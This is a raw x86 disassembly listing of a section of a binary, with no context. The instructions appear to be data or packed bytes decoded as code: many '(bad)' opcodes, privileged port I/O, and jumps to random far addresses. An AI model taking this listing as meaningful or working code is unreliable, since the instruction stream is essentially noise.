  41c20d:	fild   DWORD PTR [esi+0xae92830]
  41c214:	and    DWORD PTR [edx],ebx
  41c216:	jecxz  0x41c221
  41c218:	pop    eax
  41c219:	sbb    eax,0x2a26645
  41c21e:	mov    es,WORD PTR [ebx]
  41c220:	fwait
  41c221:	adc    eax,0xcbec56f4
  41c226:	jmp    0x3c5155e1
  41c22b:	lea    ecx,[ebx]
  41c22d:	mov    BYTE PTR [ebx+0x50],ch
  41c230:	push   ebx
  41c231:	mov    DWORD PTR [ecx+0x14dd05b7],edi
  41c237:	inc    edx
  41c238:	repz jo 0x41c2b4
  41c23b:	les    eax,FWORD PTR [eax]
  41c23d:	icebp  
  41c23e:	(bad)  
  41c23f:	out    0x5,eax
  41c241:	pop    es
  41c242:	inc    esi
  41c243:	mov    gs,WORD PTR [esi-0x62]
  41c246:	mov    esi,0xde0f5c66
  41c24b:	loopne 0x41c1d9
  41c24d:	jno    0x41c2ac
  41c24f:	dec    esi
  41c250:	lds    edi,FWORD PTR [edi]
  41c252:	in     al,0x3d
  41c254:	(bad)  
  41c255:	ds (bad) 
  41c257:	retf   
  41c258:	xor    cl,dl
  41c25a:	(bad)  
  41c25b:	aaa    
  41c25c:	adc    al,0x0
  41c25e:	int    0x3c
  41c260:	rcr    DWORD PTR [esi],0xf9
  41c263:	stos   DWORD PTR es:[edi],eax
  41c264:	sub    esi,DWORD PTR [ebx+0x58321799]
  41c26a:	popf   
  41c26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c26c:	inc    edx
  41c26d:	mov    eax,ds:0xf387ecec
  41c272:	xor    dl,0xd6
  41c275:	aad    0x1e
  41c277:	sub    BYTE PTR [eax],bh
  41c279:	cmp    esi,DWORD PTR [eax-0x1d]
  41c27c:	push   esi
  41c27d:	sbb    DWORD PTR [ecx-0x54fde165],ebp
  41c283:	dec    esi
  41c284:	xor    ch,al
  41c286:	add    DWORD PTR [esi+0x44c2ec31],ebx
  41c28c:	outs   dx,BYTE PTR ds:[esi]
  41c28d:	jnp    0x41c2a1
  41c28f:	dec    ebp
  41c290:	(bad)  
  41c291:	call   0xe3944e6c
  41c296:	push   edi
  41c297:	scas   eax,DWORD PTR es:[edi]
  41c298:	mov    bh,0x36
  41c29a:	scas   al,BYTE PTR es:[edi]
  41c29b:	out    dx,eax
  41c29c:	int    0x0
  41c29e:	dec    esp
  41c29f:	adc    eax,DWORD PTR [eax]
  41c2a1:	push   esp
  41c2a2:	add    eax,0xd56be36d
  41c2a7:	mov    esp,0x5d632c07
  41c2ac:	jnp    0x41c286
  41c2ae:	mov    ds:0x7cc2f17f,al
  41c2b3:	or     ebp,DWORD PTR [edx+0x7f505663]
  41c2b9:	test   BYTE PTR [esi+edx*8+0x4092c089],0xe3
  41c2c1:	mov    ebp,0x90daf4c5
  41c2c6:	xchg   BYTE PTR [ecx+0x1afd4add],cl
  41c2cc:	and    eax,0x83c0a56f
  41c2d1:	add    ah,bl
  41c2d3:	pop    esp
  41c2d4:	inc    ebp
  41c2d5:	sbb    ecx,edx
  41c2d7:	inc    esp
  41c2d8:	xchg   BYTE PTR [esp+edi*4],dh
  41c2db:	pop    edx
  41c2dc:	inc    ebp
  41c2dd:	fnsave [eax-0x46]
  41c2e0:	sahf   
  41c2e1:	mov    WORD PTR [ebx-0x80],?
  41c2e4:	xor    BYTE PTR [esi+esi*8+0x63],cl
  41c2e8:	fcom   QWORD PTR [ebx-0x7f2be7aa]
  41c2ee:	sub    esp,esp
  41c2f0:	lods   eax,DWORD PTR ds:[esi]
  41c2f1:	(bad)
  41c2f4:	adc    BYTE PTR [eax-0x3c],ch
  41c2f7:	cmp    eax,0xe3859ef8
  41c2fc:	(bad)  
  41c2fd:	sub    esp,ecx
  41c2ff:	add    eax,0xddfeddfb
  41c304:	dec    esp
  41c305:	jae    0x41c29f
  41c307:	scas   eax,DWORD PTR es:[edi]
  41c308:	mov    ecx,0x6fc5b12b
  41c30d:	sub    al,0x82
  41c30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c310:	adc    al,0xd7
  41c312:	cmp    BYTE PTR ds:0xbc347042,bh
  41c318:	push   ss
  41c319:	test   al,0x1c
  41c31b:	mul    BYTE PTR [esp+esi*4]
  41c31e:	outs   dx,DWORD PTR ds:[esi]
  41c31f:	pop    edi
  41c320:	sub    eax,0xfc881b24
  41c325:	dec    eax
  41c326:	xchg   esi,eax
  41c327:	stos   DWORD PTR es:[edi],eax
  41c328:	inc    edi
  41c329:	inc    esp
  41c32a:	cdq    
  41c32b:	std    
  41c32c:	add    ebx,DWORD PTR [ebp-0x19]
  41c32f:	je     0x41c2f6
  41c331:	push   cs
  41c332:	sub    eax,0x2a62d96e
  41c337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c338:	std    
  41c339:	mov    bh,0x27
  41c33b:	push   ss
  41c33c:	and    ch,BYTE PTR [eax+edi*2+0x68d5a2d8]
  41c343:	push   esp
  41c344:	xchg   ecx,eax
  41c345:	stos   BYTE PTR es:[edi],al
  41c346:	rcl    BYTE PTR [edi],1
  41c348:	inc    ecx
  41c349:	sbb    BYTE PTR [ebp+0x7b375305],cl
  41c34f:	push   eax
  41c350:	mov    ah,0xb5
  41c352:	adc    DWORD PTR [ecx-0x12],eax
  41c355:	ror    BYTE PTR [ebx+0x690b55ba],1
  41c35b:	and    edx,DWORD PTR [eax]
  41c35d:	xor    al,0x58
  41c35f:	aaa    
  41c360:	cwde   
  41c361:	mov    ebp,0x4d9bc132
  41c366:	jnp    0x41c314
  41c368:	or     eax,0x3c4a80ba
  41c36e:	bound  edi,QWORD PTR [esi]
  41c370:	mov    dh,0x66
  41c372:	xchg   esp,eax
  41c373:	out    dx,eax
  41c374:	lahf   
  41c375:	sbb    eax,0x6a937345
  41c37a:	rcr    BYTE PTR [esp+edi*8-0x8],0x2
  41c37f:	fidiv  DWORD PTR [edi]
  41c381:	xchg   esi,eax
  41c382:	or     dl,BYTE PTR [ecx-0x75]
  41c385:	or     BYTE PTR [edi],0x92
  41c388:	aas    
  41c389:	sub    DWORD PTR [ecx+ebx*2],esp
  41c38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c38d:	stc    
  41c38e:	xchg   esp,eax
  41c38f:	fsubr  QWORD PTR [edi-0xb9ea4fc]
  41c395:	sbb    bl,BYTE PTR [ebp+0x75]
  41c398:	(bad)  
  41c399:	fsub   QWORD PTR [esi]
  41c39b:	int    0xf4
  41c39d:	mov    eax,0x9a8fafb3
  41c3a2:	inc    esp
  41c3a3:	add    DWORD PTR [ecx+0x39],ecx
  41c3a6:	jle    0x41c3ff
  41c3a8:	int    0x1e
  41c3aa:	sahf   
  41c3ab:	in     al,dx
  41c3ac:	push   cs
  41c3ad:	repz jo 0x5adafed3
  41c3b4:	mov    BYTE PTR [edi+0x38],bh
  41c3b7:	fdivr  QWORD PTR [ecx+eiz*8]
  41c3ba:	jmp    DWORD PTR [ebp+0x2e]
  41c3bd:	lds    ecx,FWORD PTR [ebx+ecx*1-0x19]
  41c3c1:	dec    ecx
  41c3c2:	call   0x8caf:0x3a217f38
  41c3c9:	lods   al,BYTE PTR ds:[esi]
  41c3ca:	cdq    
  41c3cb:	and    edi,DWORD PTR [edi-0x1fd34015]
  41c3d1:	fmulp  st(0),st
  41c3d3:	dec    ecx
  41c3d4:	mov    WORD PTR [ecx+0x1f],ss
  41c3d7:	(bad)  
  41c3d8:	push   esp
  41c3d9:	bound  ecx,QWORD PTR [esi-0x4e259c94]
  41c3df:	pushf  
  41c3e0:	outs   dx,BYTE PTR ds:[esi]
  41c3e1:	neg    cl
  41c3e3:	mov    dh,0x84
  41c3e5:	mov    dl,0x77
  41c3e7:	sub    edi,DWORD PTR [ecx]
  41c3e9:	xchg   BYTE PTR [ebx+0x79],bl
  41c3ec:	pop    ds
  41c3ed:	int    0x64
  41c3ef:	xchg   edx,eax
  41c3f0:	or     DWORD PTR [edi+esi*8],ecx
  41c3f3:	jge    0x41c460
  41c3f5:	iret   
  41c3f6:	pop    ebx
  41c3f7:	mov    eax,0x33e1e672
  41c3fc:	loop   0x41c426
  41c3fe:	out    0x15,eax
  41c400:	dec    edx
  41c401:	xchg   edi,eax
  41c402:	push   esi
  41c403:	loope  0x41c406
  41c405:	lods   al,BYTE PTR ds:[esi]
  41c406:	jne    0x41c39c
  41c408:	inc    ecx
  41c409:	fstp   TBYTE PTR [edx]
  41c40b:	(bad)  
  41c40c:	(bad)  
  41c40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c40f:	in     eax,dx
  41c410:	lods   al,BYTE PTR ds:[esi]
  41c411:	mov    eax,ds:0x3ad16ab8
  41c416:	inc    esp
  41c417:	lods   eax,DWORD PTR ds:[esi]
  41c418:	mov    BYTE PTR [ecx],dl
  41c41a:	fadd   DWORD PTR [ebp-0x27]
  41c41d:	sub    al,0xec
  41c41f:	sub    eax,0xe2222cfa
  41c424:	in     al,dx
  41c425:	lahf   
  41c426:	mov    edx,0x14d540e8
  41c42b:	mov    al,ds:0x2347d7d0
  41c430:	add    ecx,edi
  41c432:	ins    DWORD PTR es:[edi],dx
  41c433:	(bad)
  41c436:	iret   
  41c437:	cmp    dh,0x5f
  41c43a:	dec    ecx
  41c43b:	outs   dx,DWORD PTR ds:[esi]
  41c43c:	mov    ah,BYTE PTR [edi+0x1f]
  41c43f:	lahf   
  41c440:	cmp    ebx,DWORD PTR ds:0x1d5a9a89
  41c446:	mov    bl,0x8
  41c448:	or     esp,DWORD PTR [esp+ebp*1]
  41c44b:	mov    ah,0x70
  41c44d:	lods   al,BYTE PTR ds:[esi]
  41c44f:	xor    BYTE PTR [eax+0x6aa8bfdd],0xa4
  41c456:	adc    dl,cl
  41c458:	sar    BYTE PTR [edx-0x3f961298],0x36
  41c45f:	imul   edi,DWORD PTR [eax],0x7c31ea19
  41c465:	push   0x3413844
  41c46a:	sbb    BYTE PTR [esi],0x39
  41c46d:	push   esi
  41c46e:	(bad)  
  41c46f:	(bad)  
  41c471:	sub    edx,esp
  41c473:	push   edx
  41c474:	xor    al,BYTE PTR [ebx-0x73]
  41c477:	test   al,0xc6
  41c479:	mov    WORD PTR [edx-0x4d],ss
  41c47c:	mov    al,ds:0xf4ee983e
  41c481:	fbstp  TBYTE PTR ds:0x4cc3e6e4
  41c487:	or     bh,BYTE PTR [eax+0x14406bf5]
  41c48d:	fild   QWORD PTR [edi-0x15787dcc]
  41c493:	xchg   ebp,eax
  41c494:	or     al,0x55
  41c496:	mov    BYTE PTR [edi+0x265b53c9],bl
  41c49c:	add    BYTE PTR [eax+0x50b97028],ch
  41c4a2:	pop    esi
  41c4a3:	nop
  41c4a4:	mov    ah,0xb7
  41c4a6:	xcrypt-ofb (bad)
  41c4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4a8:	scas   eax,DWORD PTR es:[edi]
  41c4a9:	adc    al,BYTE PTR [edx]
  41c4ab:	out    0x63,al
  41c4ad:	dec    esi
  41c4ae:	mov    eax,0xff1a21d0
  41c4b3:	dec    eax
  41c4b4:	and    esp,edi
  41c4b6:	jae    0x41c43a
  41c4b8:	pop    ds
  41c4b9:	repz fisub DWORD PTR [esi-0x54]
  41c4bd:	or     edx,edx
  41c4bf:	jp     0x41c4b9
  41c4c1:	cdq    
  41c4c2:	jp     0x41c4e6
  41c4c4:	sub    ch,bh
  41c4c6:	dec    edx
  41c4c7:	sahf   
  41c4c8:	fisubr WORD PTR [esi+esi*4]
  41c4cb:	fsubr  QWORD PTR [eax-0x33]
  41c4ce:	mov    cl,0xfa
  41c4d0:	scas   al,BYTE PTR es:[edi]
  41c4d1:	(bad)  
  41c4d2:	iret   
  41c4d3:	or     al,0x69
  41c4d5:	xor    DWORD PTR ds:0x36420847,ebx
  41c4db:	(bad)  
  41c4dc:	loop   0x41c479
  41c4de:	mov    al,ds:0xc211f49c
  41c4e3:	shl    BYTE PTR [edx+0x5ddb1a47],cl
  41c4e9:	sbb    DWORD PTR [ebp+0x22],esp
  41c4ec:	adc    esi,DWORD PTR [edx-0x4d]
  41c4ef:	pop    esi
  41c4f0:	imul   edi,DWORD PTR [eax-0x3beb50ff],0x5ca61397
  41c4fa:	dec    ecx
  41c4fb:	lock rcl DWORD PTR [edx+0x722fc0f4],1
  41c502:	mov    ebp,0x234123c1
  41c507:	jbe    0x41c4fd
  41c509:	lahf   
  41c50a:	xor    cl,ch
  41c50c:	das    
  41c50d:	retf   
  41c50e:	clc    
  41c50f:	rcr    DWORD PTR [esi-0x2a],1
  41c512:	cmp    DWORD PTR [edi-0x19],0x8f8b744b
  41c519:	adc    DWORD PTR [ebp-0x7d],eax
  41c51c:	mov    ch,dl
  41c51e:	xchg   DWORD PTR [edi+0x772fddff],edx
  41c524:	xor    esi,DWORD PTR [ecx]
  41c526:	push   cs
  41c527:	xchg   DWORD PTR [ecx+eiz*2],ebp
  41c52a:	ins    DWORD PTR es:[edi],dx
  41c52b:	sbb    dl,ah
  41c52d:	add    BYTE PTR [eax-0x33a03321],ch
  41c533:	fwait
  41c534:	add    al,0x9f
  41c536:	mov    esi,0xdbdb7490
  41c53b:	dec    esp
  41c53c:	nop
  41c53d:	xor    bl,BYTE PTR [edx+0x2143623f]
  41c543:	xor    DWORD PTR [eax],esp
  41c545:	mov    al,0x6c
  41c547:	mov    edi,es
  41c549:	lock pop edx
  41c54b:	dec    edi
  41c54c:	sbb    al,0xdd
  41c54e:	aas    
  41c54f:	add    ah,ch
  41c551:	pop    es
  41c552:	aam    0x44
  41c554:	mov    bh,0xa7
  41c556:	jmp    0x790d0e0c
  41c55b:	das    
  41c55c:	jb     0x41c502
  41c55e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c55f:	mov    bh,0x90
  41c561:	ins    DWORD PTR es:[edi],dx
  41c562:	mov    dl,0xbf
  41c564:	pop    ds
  41c565:	xchg   ebp,eax
  41c566:	cs fst QWORD PTR gs:[ebp+0x74]
  41c56b:	and    al,0x90
  41c56d:	pusha  
  41c56e:	in     eax,dx
  41c56f:	sub    eax,DWORD PTR ds:0xa6d05c47
  41c575:	ret    
  41c576:	ret    
  41c577:	repz cs loope 0x41c557
  41c57b:	sahf   
  41c57c:	pop    edi
  41c57d:	and    BYTE PTR [ebx-0x4a],dl
  41c580:	push   ds
  41c581:	mov    cl,0xc4
  41c583:	les    eax,FWORD PTR [eax-0x320b1253]
  41c589:	push   es
  41c58a:	enter  0x777c,0xa3
  41c58e:	push   esi
  41c58f:	out    0x1d,eax
  41c591:	and    eax,0xafb1353a
  41c596:	adc    ebx,DWORD PTR [eax-0x609a288d]
  41c59c:	push   cs
  41c59d:	arpl   WORD PTR [edi+edi*4+0x67],dx
  41c5a1:	or     al,0x9e
  41c5a3:	mov    esp,0x989d448c
  41c5a8:	aad    0x77
  41c5aa:	sahf   
  41c5ab:	ja     0x41c5f8
  41c5ad:	bound  ebp,QWORD PTR [edi]
  41c5af:	xchg   edx,eax
  41c5b0:	das    
  41c5b1:	or     BYTE PTR [edx+0x3d91bf61],0x63
  41c5b8:	popf   
  41c5b9:	rcr    DWORD PTR [esi],0xa0
  41c5bc:	call   0xa897104c
  41c5c1:	icebp  
  41c5c2:	jb     0x41c625
  41c5c4:	jmp    0xe211:0x23382368
  41c5cb:	add    BYTE PTR [edx+eax*4+0x3f],dl
  41c5cf:	scas   al,BYTE PTR es:[edi]
  41c5d0:	cdq    
  41c5d1:	(bad)  
  41c5d2:	jle    0x41c585
  41c5d4:	jns    0x41c57a
  41c5d6:	enter  0x38d3,0xac
  41c5da:	fcmovne st,st(3)
  41c5dc:	aam    0x4
  41c5de:	sub    esi,DWORD PTR [ebp-0x1c152689]
  41c5e4:	sub    ecx,edx
  41c5e6:	inc    esp
  41c5e7:	arpl   ax,cx
  41c5e9:	lds    edx,FWORD PTR [edi]
  41c5eb:	mov    ds:0x4cedb9a0,al
  41c5f0:	stc    
  41c5f1:	mov    cs,WORD PTR [esi+esi*2]
  41c5f4:	in     eax,dx
  41c5f5:	ror    DWORD PTR [ecx+0x5b],1
  41c5f8:	cmp    eax,0xbeffd7df
  41c5fd:	bound  esp,QWORD PTR [esi+0x55]
  41c600:	cli    
  41c601:	lahf   
  41c602:	mov    cl,0x77
  41c604:	push   ds
  41c605:	mov    eax,ds:0x8c65a641
  41c60a:	mov    eax,ds:0xb6445e29
  41c60f:	cmp    DWORD PTR [ebx*8+0x4b62c88],esp
  41c616:	(bad)  
  41c617:	sub    esp,DWORD PTR [ecx]
  41c619:	pushf  
  41c61a:	fwait
  41c61b:	or     al,ah
  41c61d:	inc    ecx
  41c61e:	sbb    DWORD PTR [edx+0x269c2468],esi
  41c624:	mul    BYTE PTR [ecx+0x346f8546]
  41c62a:	jne    0x41c669
  41c62c:	je     0x41c5b9
  41c62e:	push   esp
  41c62f:	fadd   QWORD PTR [eax+0x6749c3d5]
  41c635:	aaa    
  41c636:	push   edi
  41c637:	jns    0x41c680
  41c639:	mov    bl,0xfd
  41c63b:	jbe    0x41c625
  41c63d:	and    ch,BYTE PTR [ecx-0x3843c96f]
  41c643:	pop    ss
  41c644:	js     0x41c5fa
  41c646:	outs   dx,BYTE PTR ds:[esi]
  41c647:	inc    esp
  41c648:	std    
  41c649:	shl    cl,cl
  41c64b:	pop    edi
  41c64c:	sub    DWORD PTR [esi+0x510707d8],ecx
  41c652:	push   ds
  41c653:	xor    BYTE PTR [esi-0x5c7707bf],dh
  41c659:	jne    0x41c662
  41c65b:	nop
  41c65c:	out    0x2,al
  41c65e:	mov    dl,0x36
  41c660:	push   ss
  41c661:	cmp    edi,esp
  41c663:	aad    0x32
  41c665:	cmp    esi,DWORD PTR [edi]
  41c667:	xchg   ebp,eax
  41c668:	jge    0x41c5f6
  41c66a:	inc    ecx
  41c66b:	(bad)  
  41c66c:	and    ah,BYTE PTR [ecx+0x4b231964]
  41c672:	(bad)  
  41c673:	repz jns 0x41c676
  41c676:	popa   
  41c677:	and    BYTE PTR [esi+ebp*8+0x42],al
  41c67b:	popf   
  41c67c:	fwait
  41c67d:	mov    edx,0x4ac665a6
  41c682:	lock inc ebp
  41c684:	xchg   BYTE PTR [esi-0x4e14d1b8],al
  41c68a:	popf   
  41c68b:	cli    
  41c68c:	xor    edi,eax
  41c68e:	test   al,0xf9
  41c690:	test   bl,al
  41c692:	push   edi
  41c693:	jbe    0x41c700
  41c695:	loopne 0x41c67f
  41c697:	loope  0x41c68d
  41c699:	pop    es
  41c69a:	bound  esp,QWORD PTR [ecx]
  41c69c:	and    eax,0x9a6bc58c
  41c6a1:	sub    cl,bl
  41c6a3:	fwait
  41c6a4:	ins    DWORD PTR es:[edi],dx
  41c6a5:	mov    esp,0x97792fa4
  41c6aa:	push   edx
  41c6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6ac:	push   cs
  41c6ad:	jmp    0x7de7dc6e
  41c6b2:	sub    DWORD PTR [eax+0x48],0xffffffe9
  41c6b6:	xor    dl,dh
  41c6b8:	adc    eax,0xae373852
  41c6bd:	or     BYTE PTR [edx],bl
  41c6bf:	push   edi
  41c6c0:	pop    ss
  41c6c1:	mov    dh,0x53
  41c6c3:	inc    ebx
  41c6c4:	icebp  
  41c6c5:	nop
  41c6c6:	push   cs
  41c6c7:	sub    ah,BYTE PTR [eax]
  41c6c9:	outs   dx,DWORD PTR ds:[esi]
  41c6ca:	inc    ebx
  41c6cb:	push   ebp
  41c6cc:	frstor [edi-0x7c]
  41c6cf:	inc    edx
  41c6d0:	frstor [eax+edi*2]
  41c6d3:	mov    dh,BYTE PTR [esi]
  41c6d5:	add    ebx,DWORD PTR ds:0x291090c7
  41c6db:	push   esp
  41c6dc:	outs   dx,BYTE PTR ds:[esi]
  41c6dd:	push   esp
  41c6df:	cdq    
  41c6e0:	pop    ds
  41c6e1:	mov    cl,al
  41c6e3:	rcl    DWORD PTR [ebx-0x67f6eeff],1
  41c6e9:	mov    DWORD PTR [esi+0x6dbe29d2],0xdc0d16b9
  41c6f3:	mov    ah,0xc7
  41c6f5:	xchg   edx,eax
  41c6f6:	test   al,0x5
  41c6f8:	push   es
  41c6f9:	mov    ebx,DWORD PTR [esi-0x5e]
  41c6fc:	or     eax,0xdee71c9d
  41c701:	aad    0x64
  41c703:	lds    esi,FWORD PTR [edi]
  41c705:	xchg   ecx,eax
  41c706:	fdiv   QWORD PTR [ebx-0x327427ea]
  41c70c:	sbb    cl,BYTE PTR [ebp+0x2e]
  41c70f:	inc    ebx
  41c710:	sbb    edx,0xffffffb4
  41c713:	fdiv   QWORD PTR [esp+esi*4-0x7ef85176]
  41c71a:	push   edi
  41c71b:	stos   DWORD PTR es:[edi],eax
  41c71c:	inc    edx
  41c71d:	outs   dx,BYTE PTR ds:[esi]
  41c71e:	repnz xchg ebx,eax
  41c720:	test   bl,ch
  41c722:	dec    eax
  41c723:	ret    0x8412
  41c726:	repz pushf 
  41c728:	or     DWORD PTR [ecx+0x325985b2],esp
  41c72e:	and    eax,0x288f0b8e
  41c733:	mov    cl,0x5
  41c735:	push   ebp
  41c736:	jg     0x41c7a6
  41c738:	mov    ah,0x1a
  41c73a:	adc    eax,0x6f7a1b6e
  41c73f:	rcl    ah,cl
  41c741:	imul   esi,esi,0x1ee2600a
  41c747:	xor    DWORD PTR [esi+eax*2],edi
  41c74a:	or     al,0x3d
  41c74c:	imul   edx,DWORD PTR [ebp-0x3],0x7a702306
  41c753:	out    dx,eax
  41c754:	add    BYTE PTR [ecx+0x6dc06226],dh
  41c75a:	sub    BYTE PTR [ecx],cl
  41c75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c75d:	push   0x426222e0
  41c762:	adc    eax,0x6d872874
  41c767:	icebp  
  41c768:	scas   eax,DWORD PTR es:[edi]
  41c769:	xchg   ebp,eax
  41c76a:	bnd jmp 0x41c789
  41c76d:	aam    0x12
  41c76f:	xchg   DWORD PTR ds:0x4f24fc32,esi
  41c775:	cmp    eax,0x45512aeb
  41c77a:	jg     0x41c795
  41c77c:	sbb    eax,DWORD PTR ds:0xbc870b5
  41c782:	arpl   WORD PTR [ebx+0x55ffe3e1],ax
  41c788:	ja     0x41c774
  41c78a:	shl    BYTE PTR ss:[ecx+0xe9c0b95],0x71
  41c792:	jg     0x41c7ef
  41c794:	ja     0x41c7a1
  41c796:	jl     0x41c810
  41c798:	stos   DWORD PTR es:[edi],eax
  41c799:	or     ah,dh
  41c79b:	and    al,0x4a
  41c79d:	push   esp
  41c79e:	popa   
  41c79f:	fcmovb st,st(4)
  41c7a1:	sar    BYTE PTR [esi],cl
  41c7a3:	sbb    bl,BYTE PTR [eax+0x1f5a4b58]
  41c7a9:	dec    ebp
  41c7aa:	add    DWORD PTR [eax+0x3a],edi
  41c7ad:	add    BYTE PTR [eax*4+0x68ec94e2],al
  41c7b4:	push   edx
  41c7b5:	loope  0x41c808
  41c7b7:	jle    0x41c82d
  41c7b9:	test   BYTE PTR [eax],al
  41c7bb:	les    ebp,FWORD PTR [ebx]
  41c7bd:	out    0x6c,al
  41c7bf:	call   0xce93:0x13b23d0
  41c7c6:	xchg   DWORD PTR [ecx+0x1b422895],edx
  41c7cc:	stos   DWORD PTR es:[edi],eax
  41c7cd:	cdq    
  41c7ce:	out    0x8e,al
  41c7d0:	mov    edi,0x5d71b467
  41c7d5:	push   ebp
  41c7d6:	mov    edx,0xd8fde7dd
  41c7db:	fdivr  st(3),st
  41c7dd:	cdq    
  41c7de:	mov    eax,ds:0xadd23182
  41c7e3:	xor    BYTE PTR [ecx*8+0x51d3dc94],bh
  41c7ea:	test   DWORD PTR [ebx*1-0x3a5937e0],ebp
  41c7f1:	cdq    
  41c7f2:	jne    0x41c815
  41c7f4:	pop    eax
  41c7f5:	jecxz  0x41c80c
  41c7f7:	mov    dh,0x3a
  41c7f9:	int    0x3
  41c7fb:	or     BYTE PTR [eax],0x36
  41c7fe:	mov    ebx,0x93683bc8
  41c803:	icebp  
  41c804:	and    edi,edx
  41c806:	pop    edx
  41c807:	mov    DWORD PTR [esi],eax
  41c809:	dec    esp
  41c80a:	pop    ebp
  41c80b:	and    dh,0x43
  41c80e:	(bad)  
  41c80f:	aam    0x55
  41c811:	sbb    DWORD PTR [eax],0x1376e14c
  41c817:	rcl    DWORD PTR [ebx],0x96
  41c81a:	ret    0x34fa
  41c81d:	xchg   ecx,eax
  41c81e:	aas    
  41c81f:	lods   eax,DWORD PTR ds:[esi]
  41c820:	inc    edx
  41c821:	xor    al,0x60
  41c823:	adc    eax,0xc77f5bff
  41c828:	add    al,dl
  41c82a:	rcl    DWORD PTR [ecx],cl
  41c82c:	fdiv   st,st(4)
  41c82e:	scas   al,BYTE PTR es:[edi]
  41c82f:	std    
  41c830:	stos   BYTE PTR es:[edi],al
  41c831:	sbb    BYTE PTR [esi-0x27f3dcb7],ch
  41c837:	lock mov al,ds:0x9ffa9f13
  41c83d:	out    dx,al
  41c83e:	dec    ebx
  41c83f:	xchg   ebx,eax
  41c840:	xchg   ebp,eax
  41c841:	inc    esi
  41c842:	arpl   WORD PTR [eax],di
  41c844:	jno    0x41c88b
  41c846:	mov    WORD PTR [edx+edx*4-0x4f],ds
  41c84a:	jae    0x41c858
  41c84c:	lods   eax,DWORD PTR ds:[esi]
  41c84d:	cwde   
  41c84e:	push   edi
  41c84f:	(bad)  [ecx+ebx*8+0x7f]
  41c853:	xlat   BYTE PTR ds:[ebx]
  41c854:	ins    BYTE PTR es:[edi],dx
  41c855:	sub    BYTE PTR [edi*1-0x2aff2b3c],ah
  41c85c:	fsub   QWORD PTR [ecx-0x7e85c6f1]
  41c862:	jmp    FWORD PTR [ecx]
  41c864:	push   edx
  41c865:	xchg   esp,eax
  41c866:	and    al,0x2
  41c868:	jbe    0x41c7ed
  41c86a:	jl     0x41c820
  41c86c:	adc    edx,DWORD PTR [edi]
  41c86e:	mov    bl,0xe2
  41c870:	dec    edx
  41c871:	sahf   
  41c872:	cs sub cl,cl
  41c875:	sbb    eax,DWORD PTR [ecx+0x44]
  41c878:	pop    ebp
  41c879:	leave  
  41c87a:	mov    edi,0x6532aba9
  41c87f:	test   eax,0xb8897ab8
  41c884:	(bad)  
  41c885:	pop    ss
  41c886:	daa    
  41c887:	add    ah,BYTE PTR [edi+0x1e3d2d00]
  41c88d:	out    dx,eax
  41c88e:	mov    eax,0x83ef4215
  41c893:	sti    
  41c894:	out    0x27,al
  41c896:	(bad)  
  41c897:	outs   dx,DWORD PTR ds:[esi]
  41c898:	xor    DWORD PTR [ebx],esi
  41c89a:	add    BYTE PTR [eax+eiz*1+0x3585bd9c],cl
  41c8a1:	aad    0xa0
  41c8a3:	(bad)  
  41c8a4:	pop    ecx
  41c8a5:	dec    ecx
  41c8a6:	out    dx,al
  41c8a7:	mov    es,esp
  41c8a9:	iret   
  41c8aa:	or     eax,0xe65b62d9
  41c8af:	lea    esi,[ecx]
  41c8b1:	popf   
  41c8b2:	mov    dl,0x99
  41c8b4:	sbb    DWORD PTR [edx+0x2b],esp
  41c8b7:	in     al,dx
  41c8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b9:	dec    eax
  41c8ba:	sti    
  41c8bb:	jae    0x41c91d
  41c8bd:	mov    eax,0xdb7f53f9
  41c8c2:	push   ebp
  41c8c3:	ror    BYTE PTR [eax+0x6ffae980],1
  41c8c9:	push   es
  41c8ca:	jno    0x41c91e
  41c8cc:	inc    eax
  41c8cd:	lahf   
  41c8ce:	dec    eax
  41c8cf:	sub    al,bh
  41c8d1:	xchg   edx,eax
  41c8d2:	xchg   edi,eax
  41c8d3:	sub    esp,0x19b80b1d
  41c8d9:	rcr    DWORD PTR [ebx],cl
  41c8db:	pop    eax
  41c8dc:	jns    0x41c909
  41c8de:	ficomp DWORD PTR [ecx]
  41c8e0:	in     eax,0x89
  41c8e2:	scas   eax,DWORD PTR es:[edi]
  41c8e3:	push   esi
  41c8e4:	jecxz  0x41c8cd
  41c8e6:	mov    ds:0x5918e3dd,al
  41c8eb:	and    DWORD PTR [edi-0x711b3bd1],ecx
  41c8f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8f2:	mov    cl,0x72
  41c8f4:	cs inc esp
  41c8f6:	sub    DWORD PTR [eax],esi
  41c8f8:	or     eax,0x6de3a091
  41c8fd:	(bad)  
  41c8fe:	fs cmp al,0xca
  41c901:	lds    ebp,FWORD PTR [ebp+0x33]
  41c904:	ss ret 0x853a
  41c908:	and    ah,BYTE PTR [ebp-0x342b7e13]
  41c90e:	jecxz  0x41c947
  41c910:	or     bh,BYTE PTR [eax-0x4105e00d]
  41c916:	pop    ecx
  41c917:	loopne 0x41c994
  41c919:	sub    ch,al
  41c91b:	pop    esp
  41c91c:	push   es
  41c91d:	push   cs
  41c91e:	pop    es
  41c91f:	push   ebp
  41c920:	and    eax,0x7fa3bbdf
  41c925:	jp     0x41c918
  41c927:	sub    eax,0x8b2c2a47
  41c92c:	out    0xc2,al
  41c92e:	sbb    eax,0xe081105e
  41c933:	dec    ecx
  41c934:	jp     0x41c8e8
  41c936:	test   DWORD PTR [eax-0x62],0x1ca48b0d
  41c93d:	push   ss
  41c93e:	mov    ds:0x2c22a850,eax
  41c943:	inc    ebx
  41c944:	cmc    
  41c945:	inc    edx
  41c946:	xchg   ebx,eax
  41c947:	cmp    dl,BYTE PTR [eax-0x17a0f767]
  41c94d:	ss repnz or al,0x8e
  41c951:	shrd   ecx,eax,0x3e
  41c955:	(bad)  
  41c956:	inc    BYTE PTR [eax-0x1751f5e9]
  41c95c:	cmp    DWORD PTR [edi-0x2aa50125],ebp
  41c962:	scas   eax,DWORD PTR es:[edi]
  41c963:	add    al,0x6a
